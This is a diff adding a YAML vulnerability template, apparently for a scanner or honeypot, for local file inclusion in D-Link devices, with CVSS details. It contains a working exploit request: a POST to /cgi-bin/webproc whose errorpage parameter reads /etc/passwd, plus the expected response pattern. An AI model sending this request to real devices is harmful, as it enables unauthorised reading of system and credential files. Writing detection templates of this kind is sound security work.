@@ -1,0 +1,25 @@
+id: dlink-file-read
+info:
+  name: D-Link - Local File Inclusion
+  author: dhiyaneshDK
+  description: D-Link is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://suid.ch/research/DAP-2020_Preauth_RCE_Chain.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 1
+  tags: dlink,lfi,misconfig
+traps:
+- request:
+    method: POST
+    path: /cgi-bin/webproc
+    headers: null
+    body: errorpage=/etc/passwd&obj-action=auth&:action=login
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
